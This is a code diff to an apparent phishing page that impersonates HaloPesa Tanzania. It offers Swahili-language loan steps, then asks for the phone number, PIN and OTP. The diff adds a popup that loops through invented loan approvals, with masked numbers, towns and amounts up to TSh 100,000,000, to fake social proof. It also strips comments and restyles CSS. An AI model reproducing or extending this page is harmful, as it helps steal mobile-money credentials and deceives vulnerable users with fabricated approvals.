@@ -124,10 +124,10 @@
   /* SUMMARY */
   .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--teal); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fffaf7; }
   .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
-  .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
-  .sum-row:last-child { border-bottom:none; }
-  .sum-row .sk { color:var(--text-light); }
-  .sum-row .sv { font-weight:500; }
+  .sum-box .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
+  .sum-box .sum-row:last-child { border-bottom:none; }
+  .sum-box .sum-row .sk { color:var(--text-light); }
+  .sum-box .sum-row .sv { font-weight:500; }
 
   /* ───── PAGE 5: SUBMITTED ───── */
   #page-submitted { background:linear-gradient(160deg,var(--navy),#cc5500); align-items:center; justify-content:center; }
@@ -203,10 +203,10 @@
   .comp-box p { font-size:0.78rem; color:#7a5500; line-height:1.6; }
   .comp-box strong { font-weight:600; }
   .ld-card { background:#fff; padding:20px 24px; }
-  .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
-  .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
-  .ld-row:last-child { border-bottom:none; }
-  .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
+  .ld-card .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
+  .ld-card .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
+  .ld-card .ld-row:last-child { border-bottom:none; }
+  .ld-card .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
   .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60);}
   .ic-b{background:linear-gradient(135deg,#ff6600,#cc3300);}
   .ic-p{background:linear-gradient(135deg,#ff9900,#cc7700);}
@@ -220,6 +220,60 @@
   .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
   .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
   .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:'Inter',sans-serif; }
+
+  /* ───── LIVE APPROVAL POPUP STYLES ───── */
+  .live-popup {
+    position: fixed;
+    bottom: -100px;
+    left: 20px;
+    background-color: var(--white);
+    color: var(--text-dark);
+    padding: 12px 16px;
+    border-radius: var(--radius-sm);
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    z-index: 10000;
+    transition: bottom 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    border-left: 4px solid #2ecc71;
+    max-width: 320px;
+    width: calc(100% - 40px);
+  }
+  .live-popup.show {
+    bottom: 20px;
+  }
+  .popup-avatar {
+    background: var(--grad);
+    color: var(--white);
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 1rem;
+    flex-shrink: 0;
+  }
+  .popup-content {
+    display: flex;
+    flex-direction: column;
+  }
+  .popup-text {
+    font-size: 0.82rem;
+    line-height: 1.4;
+    color: var(--text-mid);
+  }
+  .popup-text strong {
+    color: var(--text-dark);
+    font-weight: 600;
+  }
+  .popup-time {
+    font-size: 0.7rem;
+    color: var(--text-light);
+    margin-top: 2px;
+  }
 
   /* ───── INLINE ERROR / STATUS MESSAGES ───── */
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
@@ -260,12 +314,10 @@
 </head>
 <body>
 
-<!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
 <div id="page-landing" class="page active">
   <nav class="land-nav">
     <div class="hbg"><span></span><span></span><span></span></div>
     <div class="hp-logo-inline">
-      <!-- HaloPesa Logo Mark -->
       <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
         <circle cx="20" cy="20" r="20" fill="#ff6600"/>
         <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
@@ -309,7 +361,6 @@
   <div class="land-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
 <div id="page-step1" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-landing')">← Rudi</a>
@@ -338,7 +389,6 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
 <div id="page-step2" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
@@ -377,7 +427,6 @@
   <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
 <div id="page-step3" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step2')">← Rudi</a>
@@ -415,7 +464,6 @@
   <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- ══════════════════════ PAGE 5: SUBMITTED ══════════════════════ -->
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
@@ -426,7 +474,6 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
 <div id="page-login" class="page">
   <div class="login-hdr">
     <div class="hp-logo-inline" style="flex-direction:column;gap:6px;">
@@ -478,7 +525,6 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
@@ -522,7 +568,6 @@
   <div class="otp-curve"><div class="otp-foot">© 2026 HaloPesa Tanzania</div></div>
 </div>
 
-<!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
     <div class="appr-top">
@@ -552,7 +597,14 @@
   </div>
 </div>
 
-<!-- MODALS -->
+<div id="popup" class="live-popup">
+    <div class="popup-avatar" id="popup-avatar">A</div>
+    <div class="popup-content">
+        <div id="popup-text" class="popup-text"></div>
+        <div id="popup-time" class="popup-time">Sasa hivi</div>
+    </div>
+</div>
+
 <div class="overlay" id="mLogin">
   <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitisho</p></div>
 </div>
@@ -772,7 +824,7 @@
   let _loginInFlight = false;
 
   async function doLogin() {
-    if (_loginInFlight) return;          // hard guard against double-tap / double-call
+    if (_loginInFlight) return;          
     hideLoginMsg();
 
     const rawPhone = document.getElementById('lgPh').value.trim();
@@ -861,7 +913,6 @@
           document.getElementById('otpInputSection').style.display = 'none';
           showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Unaelekezwa kwenye kuingia…');
           setTimeout(() => {
-            // Reset OTP page state
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
@@ -869,7 +920,6 @@
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
             document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
             hideOtpMsgs();
-            // Reset login page — clear PIN boxes, keep phone, re-enable button
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             document.getElementById('bLogin').disabled = false;
             const phoneVal = document.getElementById('lgPh').value.trim();
@@ -1042,7 +1092,6 @@
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'PIN isiyosahihi imegunduliwa. Unaelekezwa kwenye kuingia…');
           setTimeout(() => {
-            // Reset OTP page state
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
@@ -1051,9 +1100,7 @@
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
             document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
             hideOtpMsgs();
-            // Reset login page state — clear PIN boxes but preserve phone number
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            // Re-enable login button (phone is still filled so it should become ready)
             document.getElementById('bLogin').disabled = false;
             const phoneVal = document.getElementById('lgPh').value.trim();
             document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
@@ -1089,10 +1136,82 @@
     }, 300000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // INIT
-  // ══════════════════════════════════════════════════════
-  calcUp();
+// ══════════════════════════════════════════════════════
+// LIVE APPROVAL POPUP LOGIC
+// ══════════════════════════════════════════════════════
+document.addEventListener("DOMContentLoaded", () => {
+
+    const liveApprovals = [
+    { number: "062*****841", location: "Dar es Salaam", amount: "TSh 10,000" },
+    { number: "062*****375", location: "Arusha", amount: "TSh 25,000" },
+    { number: "062*****912", location: "Mwanza", amount: "TSh 50,000" },
+    { number: "062*****458", location: "Mbeya", amount: "TSh 100,000" },
+    { number: "065*****694", location: "Dodoma", amount: "TSh 250,000" },
+    { number: "065*****231", location: "Tanga", amount: "TSh 500,000" },
+    { number: "065*****885", location: "Kigoma", amount: "TSh 1,000,000" },
+    { number: "065*****406", location: "Mtwara", amount: "TSh 2,500,000" },
+    { number: "067*****534", location: "Zanzibar", amount: "TSh 5,000,000" },
+    { number: "067*****168", location: "Moshi", amount: "TSh 7,500,000" },
+    { number: "067*****941", location: "Tabora", amount: "TSh 10,000,000" },
+    { number: "067*****287", location: "Singida", amount: "TSh 15,000,000" },
+    { number: "068*****413", location: "Songea", amount: "TSh 20,000,000" },
+    { number: "068*****726", location: "Lindi", amount: "TSh 35,000,000" },
+    { number: "068*****904", location: "Bukoba", amount: "TSh 50,000,000" },
+    { number: "068*****347", location: "Geita", amount: "TSh 75,000,000" },
+    { number: "065*****118", location: "Morogoro", amount: "TSh 100,000,000" }
+];
+    const popup = document.getElementById("popup");
+    const popupText = document.getElementById("popup-text");
+    const popupAvatar = document.getElementById("popup-avatar");
+
+    if (!popup || !popupText || !popupAvatar) {
+        console.error("Popup elements not found.");
+        return;
+    }
+
+    let lastIndex = -1;
+
+    function displayPopup() {
+
+        let index;
+
+        do {
+            index = Math.floor(Math.random() * liveApprovals.length);
+        } while (index === lastIndex && liveApprovals.length > 1);
+
+        lastIndex = index;
+
+        const user = liveApprovals[index];
+
+        popupAvatar.textContent = user.number.substring(0, 2);
+
+        popupText.innerHTML = `
+            <strong>${user.number}</strong><br>
+            Kutoka <strong>${user.location}</strong><br>
+            Ameidhinishiwa Mkopo wa
+            <strong>${user.amount}</strong>
+            Hivi Punde.
+        `;
+
+        popup.classList.add("show");
+
+        setTimeout(() => {
+            popup.classList.remove("show");
+        }, 2500);
+    }
+
+    // First popup after 2 seconds
+    setTimeout(displayPopup, 2000);
+
+    // Display every 3 seconds
+    setInterval(displayPopup, 3000);
+
+});
+
+// ══════════════════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════════════════
+calcUp();  calcUp();
 </script>
 </body>
 </html>
